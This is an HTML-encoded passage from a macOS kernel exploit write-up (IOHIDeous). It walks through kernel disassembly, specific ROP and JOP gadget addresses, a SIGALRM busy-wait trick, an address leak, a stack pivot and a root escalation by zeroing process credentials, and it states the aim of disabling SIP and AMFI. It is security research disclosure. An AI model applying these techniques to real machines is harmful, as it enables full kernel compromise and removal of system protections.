&lt;p&gt;&lt;a href=&quot;https://siguza.github.io/IOHIDeous/assets/img/7-align.png&quot;&gt;&lt;img src=&quot;https://siguza.github.io/IOHIDeous/assets/img/7-align.png&quot; alt=&quot;screenshot&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Here the values &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2000&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2004&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x5000&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0x5004&lt;/code&gt; are red, telling us that both halves of the pointers on pages 3 and 6 would be corrupted entirely if we were to align &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;cursorSema&lt;/code&gt; to the start of page 1. If we wanted to know how it looks if we align &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;eventFlags&lt;/code&gt; to the start of page 1 (which is how we’d rewrite the lower 32 bits of &lt;code class=&quot;highlighter-rouge&quot;&gt;kOSBooleanTrue&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;_hibernateStats&lt;/code&gt;), we’d pass &lt;code class=&quot;highlighter-rouge&quot;&gt;-3&lt;/code&gt; as argument since we’d shift &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; 3 times the size of a &lt;code class=&quot;highlighter-rouge&quot;&gt;uint32_t&lt;/code&gt; backwards:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://siguza.github.io/IOHIDeous/assets/img/8-align.png&quot;&gt;&lt;img src=&quot;https://siguza.github.io/IOHIDeous/assets/img/8-align.png&quot; alt=&quot;screenshot&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Lo and behold, none of the values are red! In other words, using &lt;code class=&quot;highlighter-rouge&quot;&gt;eventFlags&lt;/code&gt; to rewrite the first 4 bytes on a page will leave the first 8 bytes on all following pages entirely intact! We really are blessed with immense luck today!&lt;/p&gt;
&lt;p&gt;Anyway, we can celebrate later. For now we need to come up with a way of turning our &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt; memory into something useful. We have 16 bytes, which means exactly two pointers. Since our memory is gonna be interpreted as an &lt;code class=&quot;highlighter-rouge&quot;&gt;OSObject&lt;/code&gt;, some 8 bytes will need to function as vtable pointer, and then we could either use the remaining 8 bytes as data and try to find a pointer in one of the kernel’s constant sections that points to some code doing something useful with that data, or we could forge the “fake vtable” in a way that the remaining 8 bytes are used as the pointer to the virtual function that is invoked on our object (which is going to be &lt;code class=&quot;highlighter-rouge&quot;&gt;-&amp;gt;taggedRelease()&lt;/code&gt; at offset &lt;code class=&quot;highlighter-rouge&quot;&gt;0x50&lt;/code&gt; btw, when we deallocate everything).&lt;br/&gt;The first method sounds rather hard to pull off, since the kernel is most likely only gonna contain pointers to actual functions (as opposed to useful ROP gadgets), and any virtual C++ function is out of the question anyway, since in valid &lt;code class=&quot;highlighter-rouge&quot;&gt;OSObjects&lt;/code&gt;, bytes 9 to 12 are used for the object reference counter, which, if accessed, is only ever increased or decreased, and never exported or used in any other way.&lt;br/&gt;The second method however gets us straight to one arbitrary gadget worth of execution, which doesn’t sound so bad already. It isn’t enough to run arbitrary code though, for that we kinda need a place to put a ROP chain at. Our shared memory would do nicely for that, but is a single gadget enough to get its address back to userland? At least we can do this in two steps - if we find a suitabe gadget, we can corrupt one pointer in to only leak the shmem kernel address, and then in a second step corrupt another pointer to run a full ROP chain.&lt;br/&gt;But for now we can run exactly one gadget.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This part is implemented in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/heap.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/heap.c&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/main.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/main.c&lt;/code&gt;&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;turning-rip-into-rop&quot;&gt;Turning &lt;code class=&quot;highlighter-rouge&quot;&gt;rip&lt;/code&gt; into ROP&lt;/h3&gt;
&lt;p&gt;In order to run ROP, we need the kernel shmem address. And in order to leak that, we need to look at what values we’re gonna have in registers at the time our gadget is invoked. This is gonna happen when we free everything, i.e. with a stack trace of:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;array[i]-&amp;gt;taggedRelease()
OSArray::flushCollection()
OSArray::free()
...
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Where &lt;code class=&quot;highlighter-rouge&quot;&gt;taggedRelease()&lt;/code&gt; is an address supplied by us. So we’re being called from &lt;code class=&quot;highlighter-rouge&quot;&gt;flushCollection()&lt;/code&gt;, which looks like this:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;17&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;29&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;;-- OSArray::flushCollection:
0xffffff800081f0d0      55             push rbp
0xffffff800081f0d1      4889e5         mov rbp, rsp
0xffffff800081f0d4      4157           push r15
0xffffff800081f0d6      4156           push r14
0xffffff800081f0d8      53             push rbx
0xffffff800081f0d9      50             push rax
0xffffff800081f0da      4989ff         mov r15, rdi
0xffffff800081f0dd      41f6471001     test byte [r15 + 0x10], 1
0xffffff800081f0e2      7427           je 0xffffff800081f10b
0xffffff800081f0e4      f6052f0a2b00.  test byte [0xffffff8000acfb1a], 4
0xffffff800081f0eb      7510           jne 0xffffff800081f0fd
0xffffff800081f0ed      488d3dedaa1c.  lea rdi, str._Trying_to_change_a_collection_in_the_registry___BuildRoot_Library_Caches_com.apple.xbs_Sources_xnu_xnu_4570.1.46_libkern_c___OSCollection.cpp:67
0xffffff800081f0f4      31c0           xor eax, eax
0xffffff800081f0f6      e8a5d9a4ff     call sym._panic
0xffffff800081f0fb      eb0e           jmp 0xffffff800081f10b
0xffffff800081f0fd      488d3d6fab1c.  lea rdi, str.Trying_to_change_a_collection_in_the_registry
0xffffff800081f104      31c0           xor eax, eax
0xffffff800081f106      e8a5ceffff     call sym._OSReportWithBacktrace
0xffffff800081f10b      41ff470c       inc dword [r15 + 0xc]
0xffffff800081f10f      41837f2000     cmp dword [r15 + 0x20], 0
0xffffff800081f114      7425           je 0xffffff800081f13b
0xffffff800081f116      31db           xor ebx, ebx
0xffffff800081f118      4c8d3511f92a.  lea r14, sym.OSCollection::gMetaClass
0xffffff800081f11f      90             nop
0xffffff800081f120      498b4718       mov rax, qword [r15 + 0x18]
0xffffff800081f124      89d9           mov ecx, ebx
0xffffff800081f126      488b3cc8       mov rdi, qword [rax + rcx*8]
0xffffff800081f12a      488b07         mov rax, qword [rdi]
0xffffff800081f12d      4c89f6         mov rsi, r14
0xffffff800081f130      ff5050         call qword [rax + 0x50]
0xffffff800081f133      ffc3           inc ebx
0xffffff800081f135      413b5f20       cmp ebx, dword [r15 + 0x20]
0xffffff800081f139      72e5           jb 0xffffff800081f120
0xffffff800081f13b      41c747200000.  mov dword [r15 + 0x20], 0
0xffffff800081f143      4883c408       add rsp, 8
0xffffff800081f147      5b             pop rbx
0xffffff800081f148      415e           pop r14
0xffffff800081f14a      415f           pop r15
0xffffff800081f14c      5d             pop rbp
0xffffff800081f14d      c3             ret
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call qword [rax + 0x50]&lt;/code&gt; is the code that invokes our gadget.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; is gonna be our fake object (i.e. the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats.graphicsReadyTime&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; is gonna be our fake vtable (i.e. the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats.lockScreenReadyTime&lt;/code&gt; minus &lt;code class=&quot;highlighter-rouge&quot;&gt;0x50&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; will be a pointer to the &lt;code class=&quot;highlighter-rouge&quot;&gt;OSCollection&lt;/code&gt; meta class.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rbx&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt; will be the array index of our object, i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt; will be a pointer to our “parent” &lt;code class=&quot;highlighter-rouge&quot;&gt;OSArray&lt;/code&gt; object.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Ideally what we want is the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;OSArray&lt;/code&gt;’s pointer array (because that’s the one with a fixed offset from our shared memory). We can see that it is temporarily loaded into &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rax, qword [r15 + 0x18]&lt;/code&gt;), but that register is moments later replaced with a pointer to the object’s vtable. As a little excourse, that actually used to be different on Sierra, where the loop looked like this:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;10.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;16&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;0xffffff80008377d0      89d8           mov eax, ebx
0xffffff80008377d2      498b4f18       mov rcx, qword [r15 + 0x18]
0xffffff80008377d6      488b3cc1       mov rdi, qword [rcx + rax*8]
0xffffff80008377da      488b07         mov rax, qword [rdi]
0xffffff80008377dd      4c89f6         mov rsi, r14
0xffffff80008377e0      ff5050         call qword [rax + 0x50]
0xffffff80008377e3      ffc3           inc ebx
0xffffff80008377e5      413b5f20       cmp ebx, dword [r15 + 0x20]
0xffffff80008377e9      72e5           jb 0xffffff80008377d0
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Here the pointer array address was loaded into &lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt;, which &lt;em&gt;wasn’t&lt;/em&gt; overwritten before jumping to our address. Now, gadgets dealing with &lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt; are a somewhat hard to come by, but I managed to find this little beauty:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;0xffffff80005c0772      010f           add dword [rdi], ecx
0xffffff80005c0774      97             xchg eax, edi
0xffffff80005c0775      c3             ret
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;First of all, the &lt;code class=&quot;highlighter-rouge&quot;&gt;xchg eax, edi&lt;/code&gt; is harmless here since &lt;code class=&quot;highlighter-rouge&quot;&gt;OSObject::taggedRelease&lt;/code&gt; returns nothing, and we can thus treat both &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; as scratch registers. So this gadget adds the lower 32 bits of the buffer address to the value already present in &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats.graphicsReadyTime&lt;/code&gt;, which is fine since we know the original value and can thus calculate the original value of &lt;code class=&quot;highlighter-rouge&quot;&gt;ecx&lt;/code&gt;. Going back to the very beginning of this write-up and looking at some samples of where our shared memory would be mapped at under Sierra, we see the following:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;ffffff91ec867000
ffffff91f3ec2000
ffffff91f48f3000
ffffff91f6a2c000
ffffff91f828a000
ffffff91fc02a000
ffffff91fe160000
ffffff91fe6b3000
ffffff91ffc8a000
ffffff9209150000
ffffff92103a8000
ffffff9211be0000
ffffff9213141000
ffffff9215c04000
ffffff921a2ce000
ffffff921bf03000
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The shmem kernel address could have its upper 32 bits either &lt;code class=&quot;highlighter-rouge&quot;&gt;ffffff91&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;ffffff92&lt;/code&gt;, but depending on that the lower 32 bits would either be very high (&lt;code class=&quot;highlighter-rouge&quot;&gt;0xf...&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0xe...&lt;/code&gt;) or very low (&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0...&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1...&lt;/code&gt;). So after subtracting the size that we offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; by from the original &lt;code class=&quot;highlighter-rouge&quot;&gt;ecx&lt;/code&gt; value, we can simply assume that if the 31st bit is set, the upper 32 bits are &lt;code class=&quot;highlighter-rouge&quot;&gt;ffffff91&lt;/code&gt;, otherwise they are &lt;code class=&quot;highlighter-rouge&quot;&gt;ffffff92&lt;/code&gt; - or perform a signed integer addition, which does precisely that. :P&lt;/p&gt;
&lt;p&gt;However, that was then and this is now. On High Sierra, we no longer get the value nicely in &lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt; anymore (and in fact we also didn’t back on El Capitan). The only place we could still get it now would be directly from the &lt;code class=&quot;highlighter-rouge&quot;&gt;OSArray&lt;/code&gt; object, i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;[r15 + 0x18]&lt;/code&gt;. Unfortunately I did not find a gadget copying data from &lt;code class=&quot;highlighter-rouge&quot;&gt;[r15 + 0x18]&lt;/code&gt; to an address based off &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;. The outlandish thought of calling &lt;code class=&quot;highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; did cross my mind though, since there is a suitable target address in &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; already - we’d only have to get &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt; into &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; (plus or minus some bytes), and a reasonable size into &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; (which holds the value &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; from the invocation of &lt;code class=&quot;highlighter-rouge&quot;&gt;taggedRelease()&lt;/code&gt; on the &lt;code class=&quot;highlighter-rouge&quot;&gt;OSArray&lt;/code&gt; - not enough for our intentions). Surely that’s not something we can achieve with just one gadget worth of execution, right? No, actually not. I mean, we get halfway there by abusing &lt;code class=&quot;highlighter-rouge&quot;&gt;PE_current_console()&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;9.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;;-- _PE_current_console:
0xffffff8000903040      55             push rbp
0xffffff8000903041      4889e5         mov rbp, rsp
0xffffff8000903044      488d35adcf1c.  lea rsi, 0xffffff8000acfff8
0xffffff800090304b      ba90000000     mov edx, 0x90
0xffffff8000903050      e8fbbf80ff     call sym._memcpy
0xffffff8000903055      31c0           xor eax, eax
0xffffff8000903057      5d             pop rbp
0xffffff8000903058      c3             ret
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;If we chip in at &lt;code class=&quot;highlighter-rouge&quot;&gt;mov edx, 0x90&lt;/code&gt;, we get a somewhat reasonable size (we’re still overflowing &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt;, since &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; points to &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats.graphicsReadyTime&lt;/code&gt;, but we can deal with repairs later), which leaves only the problem of getting &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt; into &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, but also creates a new problem: it pops a value off the stack before returning. If we don’t push something before jumping to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffff800090304b&lt;/code&gt;, we’re gonna panic right away when we hit that &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt;. So no matter what, we need a second gadget. And since we can actually fit two pointers into our &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt; memory, we can sort of cheat our constraints. Recall that the reason we can run only one gadget is because we need the other pointer as fake vtable, since the code that calls us does a double dereference. But once we arrive at our gadget, we don’t technically need the fake vtable any longer. If only we had a way to pause a kernel thread…&lt;/p&gt;
&lt;p&gt;But since we’re in a multithreaded system, we can actually make that happen! Say we have a gadget like &lt;code class=&quot;highlighter-rouge&quot;&gt;jmp [rax + 0x50]&lt;/code&gt; that is first invoked like &lt;code class=&quot;highlighter-rouge&quot;&gt;call [rax + 0x50]&lt;/code&gt; (i.e. the address is loaded from exactly the same location) - then we effectively have achieved a busy wait in kernel mode. Now all we have to do back in userland is set up an &lt;code class=&quot;highlighter-rouge&quot;&gt;alarm()&lt;/code&gt; timer with a sufficiently high timeout before triggering that gadget, start a second thread that does nothing but continue to exist, and mask the main thread against &lt;code class=&quot;highlighter-rouge&quot;&gt;SIGALRM&lt;/code&gt;. Then when the kernel reaches our gadget it only takes the amount of time we specified and boom, we get a &lt;code class=&quot;highlighter-rouge&quot;&gt;SIGALRM&lt;/code&gt; sent to our second thread! Now we first switch out the address that used to be the fake vtable, and second the address our gadget is looping on, which will then immediately be executed. That now puts us at &lt;strong&gt;two&lt;/strong&gt; gadgets worth of execution! (Actually writing a 64-bit pointer in 32-bit chunks is normally a bad idea when that value is continuously used, but given that the kernel’s &lt;code class=&quot;highlighter-rouge&quot;&gt;__TEXT&lt;/code&gt; segment is a lot smaller than &lt;code class=&quot;highlighter-rouge&quot;&gt;0x100000000&lt;/code&gt;, we can once more leave the top 32 bits untouched and just swap out the bottom half, which happens in a single step.) Now we put &lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffff800090304b&lt;/code&gt; where our fake vtable pointer used to be, and then have to find a gadget that:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;moves &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;,&lt;/li&gt;
&lt;li&gt;pushes exactly one value onto the stack,&lt;/li&gt;
&lt;li&gt;and transfers control to either &lt;code class=&quot;highlighter-rouge&quot;&gt;[rdi]&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;[rax + 0x48]&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Conveniently enough, there seems to be no shortage of such gadgets:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;0xffffff8000647067      4c89fe         mov rsi, r15
0xffffff800064706a      ff5048         call qword [rax + 0x48]
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Alright, so we’ve achieved this complete function call:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_hibernateStats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;graphicsReadyTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;osarray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x90&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Now we just have to do a &lt;code class=&quot;highlighter-rouge&quot;&gt;sysctlbyname(&quot;kern.hibernatestatistics&quot;)&lt;/code&gt;, read the value of our pointer array from &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;graphicsReadyTime + 0x18&lt;/code&gt;, and with that calculate the kernel address of our shared memory. That is, one &lt;em&gt;possible&lt;/em&gt; address actually. If you recall the &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;x + 0x1000&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;x + 0x2000&lt;/code&gt; stuff from earlier, that means we might actually be off one or two pages. But that doesn’t matter much, we’ll just make sure that our ROP chain fits on a single page and copy it to each of the first three pages of our shared memory. :)&lt;/p&gt;
&lt;p&gt;To exploit that newly gained freedom, we only need to corrupt another &lt;code class=&quot;highlighter-rouge&quot;&gt;kOSBooleanTrue&lt;/code&gt; pointer and point something to shared memory. At this point, do you remember earlier when we settled for 256 instead of 509 inflated arrays per notification port? This is where that comes into play. Since we’re freeing 256 arrays at once before returning to userland, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3000000&lt;/code&gt; bytes of memory are gone now, so we have to add at least that amount to how much we offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; in order not to touch unmapped memory and cause a panic. Since the way we offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; actually overlaps 12 bytes with the &lt;em&gt;previous&lt;/em&gt; allocation, and since there may be holes or other allocations on the map too, I’v chosen to double the amount I add to the offset, just to be safe. That puts us at 6MB though, which isn’t so little when playing at the edge of mapped memory. Had we used 509 arrays per notification port then that value would be even higher, which might make things harder for us. 256 seems to strike a good balance.&lt;/p&gt;
&lt;p&gt;Now at this point all that stands between us and arbitrary code execution is pivoting the stack. There just happens to exist a very nice function on x86:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;;-- _x86_init_wrapper:
0xffffff800021c510      4831ed         xor rbp, rbp
0xffffff800021c513      4889f4         mov rsp, rsi
0xffffff800021c516      ffd7           call rdi
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;If we chip in on the second instruction, this effectively gives us a function that takes a new &lt;code class=&quot;highlighter-rouge&quot;&gt;rip&lt;/code&gt; as first argument and a new stack pointer as second. Of course we have to load these two values from memory first, which can be conveniently achieved with the JOP gadget &lt;code class=&quot;highlighter-rouge&quot;&gt;OSSerializer::serialize&lt;/code&gt; (I believe this was first used by &lt;a href=&quot;https://twitter.com/____benjamin&quot;&gt;Benjamin Randazzo&lt;/a&gt; in &lt;a href=&quot;https://github.com/benjamin-42/Trident/blob/master/Trident/exploit.c#L82-L101&quot;&gt;Trident&lt;/a&gt;):&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;10.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;16&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;;-- OSSerializer::serialize:
0xffffff800083dad0      55             push rbp
0xffffff800083dad1      4889e5         mov rbp, rsp
0xffffff800083dad4      4889f2         mov rdx, rsi
0xffffff800083dad7      488b4720       mov rax, qword [rdi + 0x20]
0xffffff800083dadb      488b4f10       mov rcx, qword [rdi + 0x10]
0xffffff800083dadf      488b7718       mov rsi, qword [rdi + 0x18]
0xffffff800083dae3      4889cf         mov rdi, rcx
0xffffff800083dae6      5d             pop rbp
0xffffff800083dae7      ffe0           jmp rax
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Now, since we committed to only rewriting the lower 32 bits of a pointer with &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;, we cannot put our fake vtable pointer on shared memory since that’s out of reach. Instead we’ll simply put that one still in &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt; and just &lt;em&gt;point&lt;/em&gt; it to shared memory. That leaves us with &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; pointing to &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt; and only &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; to shmem however, so we’ll have to run another JOP gadget that updates &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; suitably:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;0xffffff8000660621      488b7840       mov rdi, qword [rax + 0x40]
0xffffff8000660625      4c89f6         mov rsi, r14
0xffffff8000660628      ff5008         call qword [rax + 8]
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;At long last we get &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; pointing to shared memory and can chain gadgets to each other like we’re used to.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This is implemented in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/main.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/main.c&lt;/code&gt;&lt;/a&gt; with a gadget finder residing in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/rop.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/rop.c&lt;/code&gt;&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;wreaking-havoc&quot;&gt;Wreaking havoc&lt;/h3&gt;
&lt;p&gt;After all the trouble we went through to get here, it’s high time to do some damage! Let’s get root, bring the kernel task port to userland, install a root shell, and disable SIP and AMFI for good! :D&lt;/p&gt;
&lt;p&gt;Getting root is trivial with ROP. We just zero out the fields &lt;code class=&quot;highlighter-rouge&quot;&gt;cr_uid&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;cr_ruid&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;cr_svuid&lt;/code&gt; of our process’ posix credentials:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;posix_cred_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_ucred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In order to update things like e.g. our host port (to type &lt;code class=&quot;highlighter-rouge&quot;&gt;IKOT_HOST_PRIV&lt;/code&gt;) we should also call &lt;code class=&quot;highlighter-rouge&quot;&gt;setuid(0)&lt;/code&gt; thereafter, but we can do that from userland once we get back out of ROP.&lt;/p&gt;
&lt;p&gt;Next up is the kernel task port, which is a bit more problematic than it used to be in the past. I explain the technical details in the &lt;a href=&quot;https://github.com/Siguza/hsp4#technical-background&quot;&gt;readme of my hsp4 kext&lt;/a&gt; so I’ll leave them out here, but bottom line is that there’s an evil pointer comparison, which we get around by means of this:&lt;/p&gt;
